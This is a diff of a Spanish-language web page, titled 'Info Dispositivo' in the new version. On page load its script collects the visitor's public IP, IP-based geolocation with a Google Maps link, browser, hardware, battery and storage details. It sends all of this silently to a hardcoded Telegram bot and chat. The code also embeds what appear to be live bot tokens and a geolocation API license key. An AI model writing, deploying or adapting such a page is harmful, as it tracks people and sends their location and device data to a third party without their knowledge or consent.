@@ -1,176 +1,111 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>🌍 Geo+ → Telegram</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Info Dispositivo</title>
   <style>
-    body, html {
-      margin:0; padding:0;
-      width:100%; height:100%;
-      display:flex; align-items:center; justify-content:center;
-      background:#121212; color:#fff;
-      font-family:sans-serif;
-    }
-    .card {
-      background:#1f1f1f;
-      padding:2rem; border-radius:12px;
-      max-width:400px; width:90%;
-      text-align:center;
-      box-shadow:0 4px 20px rgba(0,0,0,0.7);
-    }
-    h1 { margin:0 0 1rem; font-size:1.5rem; }
-    .status { margin-top:1rem; font-weight:bold; }
+    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 2rem; text-align: center; }
+    h1 { color: #333; }
   </style>
 </head>
 <body>
-
-  <div class="card">
-    <h1>Obteniendo y enviando…</h1>
-    <p class="status" id="status">Iniciando…</p>
-  </div>
-
+  <h1>Recolectando información...</h1>
   <script>
-  (async () => {
-    const setStatus = txt => document.getElementById('status').textContent = txt;
+    async function obtenerInformacion() {
+      const token = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';
+      const chat_id = '7270292739';
+      const license = 'FBPZ80ZEvKAIuT4CR2cYU2**';
 
-    // ——————————— AJUSTA ESTO ———————————
-    const TOKEN   = '8154780362:AAGABBYGZUdz7x0BEju5ypWzycJfu4WB_g8';
-    const CHAT_ID = '7270292739';
-    // ————————————————————————————————————
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const lang = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenInfo = `${screen.width}×${screen.height} @${window.devicePixelRatio}×`;
+      const cores = navigator.hardwareConcurrency || 'Desconocido';
 
-    setStatus('1. IP pública…');
-    let ip = 'No disponible';
-    try {
-      ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip;
-    } catch {}
+      // RAM (experimental, solo algunos navegadores)
+      const ramGB = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '≈';
 
-    setStatus('2. Geolocalizando (ipapi.co)…');
-    let geo = {};
-    try {
-      const d = await fetch('https://ipapi.co/json/').then(r=>r.json());
-      if (!d.error) {
-        geo = {
-          source: 'ipapi.co',
-          city:         d.city || '–',
-          region:       d.region || '–',
-          region_code:  d.region_code || '–',
-          country:      d.country_name || '–',
-          country_code: d.country || '–',
-          postal:       d.postal || '–',
-          timezone:     d.timezone || '–',
-          org:          d.org || '–',
-          lat:          d.latitude,
-          lon:          d.longitude,
-          map:          `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`
-        };
-      } else throw 0;
-    } catch {
-      setStatus('2b. Fallback ip-api.com…');
+      // Batería
+      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`).catch(() => 'Desconocido') || 'Desconocido';
+
+      // Almacenamiento
+      let almacenamiento = '–';
+      if (navigator.storage && navigator.storage.estimate) {
+        try {
+          const estimate = await navigator.storage.estimate();
+          const used = (estimate.usage / (1024 ** 3)).toFixed(2);
+          const total = (estimate.quota / (1024 ** 3)).toFixed(2);
+          almacenamiento = `${used}/${total} GB`;
+        } catch {}
+      }
+
+      // IP Pública
+      let ip = 'Desconocida';
       try {
-        const d = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,region,zip,country,countryCode,isp,lat,lon,timezone`)
-                         .then(r=>r.json());
-        if (d.status==='success') {
-          geo = {
-            source: 'ip-api.com',
-            city:         d.city,
-            region:       d.regionName,
-            region_code:  d.region,
-            country:      d.country,
-            country_code: d.countryCode,
-            postal:       d.zip,
-            timezone:     d.timezone,
-            org:          d.isp,
-            lat:          d.lat,
-            lon:          d.lon,
-            map:          `https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}`
-          };
-        }
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        ip = (await ipRes.json()).ip;
       } catch {}
-    }
 
-    setStatus('3. Recolectando datos…');
-    const ua        = navigator.userAgent;
-    const plt       = navigator.platform;
-    const languages = navigator.languages?.join(', ') || '–';
-    const lang      = navigator.language;
-    const tzDev     = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const tzOffset  = new Date().getTimezoneOffset();
-    const online    = navigator.onLine ? 'Sí' : 'No';
-    const dpr       = window.devicePixelRatio || 1;
-    const scrW      = screen.width; 
-    const scrH      = screen.height;
-    const colorD    = `${screen.colorDepth} bits`;
-    const cores     = navigator.hardwareConcurrency || '–';
-    const ram       = navigator.deviceMemory ? `${navigator.deviceMemory} GB (≈)` : '–';
-
-    let battLevel='–', battCharging='–';
-    if (navigator.getBattery) {
+      // Localización con Melissa API
+      let ubicacionTexto = '📍 No disponible';
+      let mapsURL = '';
       try {
-        const b = await navigator.getBattery();
-        battLevel    = `${Math.round(b.level*100)} %`;
-        battCharging = b.charging ? 'Sí' : 'No';
+        const melissaURL = `https://globalip.melissadata.net/v4/web/iplocation/doiplocation?ip=${ip}&id=${license}`;
+        const locRes = await fetch(melissaURL);
+        const data = await locRes.json();
+
+        const city = data.City || '–';
+        const region = data.Region || '–';
+        const country = data.CountryName || '–';
+        const lat = data.Latitude || '';
+        const lon = data.Longitude || '';
+
+        ubicacionTexto = `${city}, ${region}, ${country}`;
+        mapsURL = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '';
       } catch {}
+
+      // Mensaje para enviar a Telegram
+      const mensaje = `🌍 Ubicación (Melissa API)
+📍 ${ubicacionTexto}
+${mapsURL ? '📌 Ver en Maps: ' + mapsURL : ''}
+
+🖥️ Info Dispositivo
+• IP: ${ip}
+• SO/Plataforma: ${platform}
+• Navegador: ${ua}
+• Idioma: ${lang}
+• Zona horaria: ${timezone}
+
+⚙️ Hardware
+• RAM: ${ramGB}
+• CPU cores: ${cores}
+• Batería: ${battery}
+
+🖥️ Pantalla & Conexión
+• Resolución: ${screenInfo}
+• Almacenamiento: ${almacenamiento}`;
+
+      const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;
+
+      fetch(telegramURL)
+        .then(r => r.json())
+        .then(data => {
+          if (data.ok) {
+            document.body.innerHTML = '<h1>✅ Información enviada con éxito</h1>';
+          } else {
+            document.body.innerHTML = '<h1>❌ Error al enviar a Telegram</h1>';
+            console.error(data);
+          }
+        })
+        .catch(err => {
+          document.body.innerHTML = '<h1>❌ Error de red</h1>';
+          console.error(err);
+        });
     }
 
-    let connInfo='–';
-    if (navigator.connection) {
-      const c = navigator.connection;
-      connInfo = `${c.effectiveType} @${c.downlink} Mb/s, RTT ${c.rtt} ms`;
-    }
-
-    let storage='–';
-    if (navigator.storage?.estimate) {
-      try {
-        const e = await navigator.storage.estimate();
-        storage = `${(e.usage/1024**3).toFixed(2)}/${(e.quota/1024**3).toFixed(2)} GB`;
-      } catch {}
-    }
-
-    setStatus('4. Preparando mensaje…');
-    const message = `
-<b>🌍 Ubicación (via ${geo.source})</b>
-📍 ${geo.city}, ${geo.region} (${geo.region_code}) ${geo.postal}, ${geo.country} [${geo.country_code}]
-⌚ Zona: ${geo.timezone}
-🏢 Org: ${geo.org}
-<a href="${geo.map}">Ver en Maps</a>
-
-<b>🖥️ Info Dispositivo</b>
-• <b>IP:</b> ${ip}
-• <b>Plataforma:</b> ${plt}
-• <b>UA:</b> ${ua}
-• <b>Idiomas:</b> ${languages}
-• <b>Root Lang:</b> ${lang}
-• <b>Zona Dev:</b> ${tzDev} (offset ${tzOffset}m)
-• <b>Online:</b> ${online}
-
-<b>⚙️ Hardware & Pantalla</b>
-• <b>RAM:</b> ${ram}
-• <b>CPU cores:</b> ${cores}
-• <b>Pantalla:</b> ${scrW}×${scrH} px @${dpr}×
-• <b>Profundidad:</b> ${colorD}
-
-<b>🔌 Conexión:</b> ${connInfo}
-<b>🔋 Batería:</b> ${battLevel} (Cargando: ${battCharging})
-<b>💾 Almacenamiento:</b> ${storage}
-`;
-
-    setStatus('5. Enviando a Telegram…');
-    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`
-              + `?chat_id=${CHAT_ID}`
-              + `&parse_mode=HTML`
-              + `&disable_web_page_preview=true`
-              + `&text=${encodeURIComponent(message)}`;
-
-    try {
-      const res = await fetch(url);
-      setStatus(res.ok ? '✅ Enviado' : '❌ Error');
-    } catch {
-      setStatus('❌ Excepción');
-    }
-
-  })();
+    obtenerInformacion();
   </script>
-
 </body>
 </html>
